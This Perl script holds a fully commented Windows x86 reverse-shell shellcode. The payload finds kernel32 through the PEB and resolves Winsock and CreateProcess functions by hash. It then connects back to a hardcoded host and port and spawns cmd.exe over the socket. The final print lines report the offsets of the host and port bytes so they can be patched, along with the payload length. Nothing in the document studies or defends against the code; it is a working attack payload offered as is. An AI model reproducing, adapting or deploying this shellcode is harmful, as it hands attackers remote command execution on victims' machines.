#!/usr/bin/env perl

my $shellcode = 
 "\x83\xEC\x30".               # sub esp,30h
"\x8B\xF4".                   # mov esi,esp
"\xE8\xF9\x00\x00\x00".       # call 00411B41
"\x89\x06".                   # mov dword ptr [esi],eax
"\xFF\x36".                   # push dword ptr [esi]
"\x68\x8E\x4E\x0E\xEC".       # push 0EC0E4E8Eh
"\xE8\x13\x01\x00\x00".       # call 00411B69
"\x89\x46\x08".               # mov dword ptr [esi+8],eax
"\x68\x6C\x6C\x00\x00".       # push 6C6Ch
"\x68\x33\x32\x2E\x64".       # push 642E3233h
"\x68\x77\x73\x32\x5F".       # push 5F327377h
"\x54".                       # push esp
"\xFF\x56\x08".               # call dword ptr [esi+8]
"\x89\x46\x04".               # mov dword ptr [esi+4],eax
"\xFF\x36".                   # push dword ptr [esi]
"\x68\x72\xFE\xB3\x16".       # push 16B3FE72h
"\xE8\xEE\x00\x00\x00".       # call 00411B69
"\x89\x46\x10".               # mov dword ptr [esi+10h],eax
"\xFF\x36".                   # push dword ptr [esi]
"\x68\x7E\xD8\xE2\x73".       # push 73E2D87Eh
"\xE8\xDF\x00\x00\x00".       # call 00411B69
"\x89\x46\x14".               # mov dword ptr [esi+14h],eax
"\xFF\x76\x04".               # push dword ptr [esi+4]
"\x68\xCB\xED\xFC\x3B".       # push 3BFCEDCBh
"\xE8\xCF\x00\x00\x00".       # call 00411B69
"\x89\x46\x18".               # mov dword ptr [esi+18h],eax
"\xFF\x76\x04".               # push dword ptr [esi+4]
"\x68\xD9\x09\xF5\xAD".       # push 0ADF509D9h
"\xE8\xBF\x00\x00\x00".       # call 00411B69
"\x89\x46\x1C".               # mov dword ptr [esi+1Ch],eax
"\xFF\x76\x04".               # push dword ptr [esi+4]
"\x68\xEC\xF9\xAA\x60".       # push 60AAF9ECh
"\xE8\xAF\x00\x00\x00".       # call 00411B69
"\x89\x46\x20".               # mov dword ptr [esi+20h],eax
"\x81\xEC\x00\x01\x00\x00".   # sub esp,100h
"\x54".                       # push esp
"\x68\x01\x01\x00\x00".       # push 101h
"\xFF\x56\x18".               # call dword ptr [esi+18h]
"\x50".                       # push eax
"\x50".                       # push eax
"\x50".                       # push eax
"\x50".                       # push eax
"\x40".                       # inc eax
"\x50".                       # push eax
"\x40".                       # inc eax
"\x50".                       # push eax
"\xFF\x56\x1C".               # call dword ptr [esi+1Ch]
"\x8B\xD8".                   # mov ebx,eax
"\xEB\x03".                   # jmp 00411ADE
##
# LFinished:
##
"\xFF\x56\x14".               # call dword ptr [esi+14h]
##
# LReconnect:
##
"\x68\xC0\xA8\x00\xF7".       # push 0F700A8C0h
"\x68\x02\x00\x22\x11".       # push 11220002h
"\x8B\xCC".                   # mov ecx,esp
"\x6A\x10".                   # push 10h
"\x51".                       # push ecx
"\x53".                       # push ebx
"\xFF\x56\x20".               # call dword ptr [esi+20h]
"\x85\xC0".                   # test eax,eax
"\x75\xE6".                   # jne 00411ADB
"\x68\x65\x78\x65\x00".       # push 657865h
"\x68\x63\x6D\x64\x2E".       # push 2E646D63h
"\x8B\xD4".                   # mov edx,esp
"\x83\xEC\x54".               # sub esp,54h
"\x8D\x3C\x24".               # lea edi,[esp]
"\xB9\x15\x00\x00\x00".       # mov ecx,15h
"\x33\xC0".                   # xor eax,eax
##
# LBzero:
##
"\xAB".                       # stos dword ptr [edi]
"\xE2\xFD".                   # loop 00411B0E
"\xC6\x44\x24\x10\x44".       # mov byte ptr [esp+10h],44h
"\xC6\x44\x24\x3D\x01".       # mov byte ptr [esp+3Dh],1
"\x89\x5C\x24\x48".           # mov dword ptr [esp+48h],ebx
"\x89\x5C\x24\x4C".           # mov dword ptr [esp+4Ch],ebx
"\x89\x5C\x24\x50".           # mov dword ptr [esp+50h],ebx
"\x8D\x44\x24\x10".           # lea eax,[esp+10h]
"\x54".                       # push esp
"\x50".                       # push eax
"\x6A\x00".                   # push 0
"\x6A\x00".                   # push 0
"\x6A\x00".                   # push 0
"\x6A\x01".                   # push 1
"\x6A\x00".                   # push 0
"\x6A\x00".                   # push 0
"\x52".                       # push edx
"\x6A\x00".                   # push 0
"\xFF\x56\x10".               # call dword ptr [esi+10h]
"\xEB\x9A".                   # jmp 00411ADB
##
# LK32Base:
##
"\x55".                       # push ebp
"\x56".                       # push esi
"\x64\xA1\x30\x00\x00\x00".   # mov eax,dword ptr fs:[00000030h]
"\x85\xC0".                   # test eax,eax
"\x78\x0C".                   # js 00411B59
"\x8B\x40\x0C".               # mov eax,dword ptr [eax+0Ch]
"\x8B\x70\x1C".               # mov esi,dword ptr [eax+1Ch]
"\xAD".                       # lods dword ptr [esi]
"\x8B\x68\x08".               # mov ebp,dword ptr [eax+8]
"\xEB\x09".                   # jmp 00411B62
##
# LK32Base9x:
##
"\x8B\x40\x34".               # mov eax,dword ptr [eax+34h]
"\x8B\xA8\xB8\x00\x00\x00".   # mov ebp,dword ptr [eax+000000B8h]
##
# LK32BaseRet:
##
"\x8B\xC5".                   # mov eax,ebp
"\x5E".                       # pop esi
"\x5D".                       # pop ebp
"\xC2\x04\x00".               # ret 4
##
# LGetProcAddress:
##
"\x53".                       # push ebx
"\x55".                       # push ebp
"\x56".                       # push esi
"\x57".                       # push edi
"\x8B\x6C\x24\x18".           # mov ebp,dword ptr [esp+18h]
"\x8B\x45\x3C".               # mov eax,dword ptr [ebp+3Ch]
"\x8B\x54\x05\x78".           # mov edx,dword ptr [ebp+eax+78h]
"\x03\xD5".                   # add edx,ebp
"\x8B\x4A\x18".               # mov ecx,dword ptr [edx+18h]
"\x8B\x5A\x20".               # mov ebx,dword ptr [edx+20h]
"\x03\xDD".                   # add ebx,ebp
##
# LFnlp:
##
"\xE3\x32".                   # jecxz 00411BB6
"\x49".                       # dec ecx
"\x8B\x34\x8B".               # mov esi,dword ptr [ebx+ecx*4]
"\x03\xF5".                   # add esi,ebp
"\x33\xFF".                   # xor edi,edi
"\xFC".                       # cld
##
# LHshlp:
##
"\x33\xC0".                   # xor eax,eax
"\xAC".                       # lods byte ptr [esi]
"\x3A\xC4".                   # cmp al,ah
"\x74\x07".                   # je 00411B9B
"\xC1\xCF\x0D".               # ror edi,0Dh
"\x03\xF8".                   # add edi,eax
"\xEB\xF2".                   # jmp 00411B8D
##
# LFnd:
##
"\x3B\x7C\x24\x14".           # cmp edi,dword ptr [esp+14h]
"\x75\xE1".                   # jne 00411B82
"\x8B\x5A\x24".               # mov ebx,dword ptr [edx+24h]
"\x03\xDD".                   # add ebx,ebp
"\x66\x8B\x0C\x4B".           # mov cx,word ptr [ebx+ecx*2]
"\x8B\x5A\x1C".               # mov ebx,dword ptr [edx+1Ch]
"\x03\xDD".                   # add ebx,ebp
"\x8B\x04\x8B".               # mov eax,dword ptr [ebx+ecx*4]
"\x03\xC5".                   # add eax,ebp
"\xEB\x02".                   # jmp 00411BB8
##
# LNtfnd:
##
"\x33\xC0".                   # xor eax,eax
##
# LDone:
##
"\x8B\xD5".                   # mov edx,ebp
"\x5F".                       # pop edi
"\x5E".                       # pop esi
"\x5D".                       # pop ebp
"\x5B".                       # pop ebx
"\xC2\x04\x00";               # ret 4

print "host: ". index($shellcode, "\xc0\xa8\x00\xf7") . "\n";
print "port: ". index($shellcode, "\x22\x11") . "\n";
print " len: ". length($shellcode) . "\n";
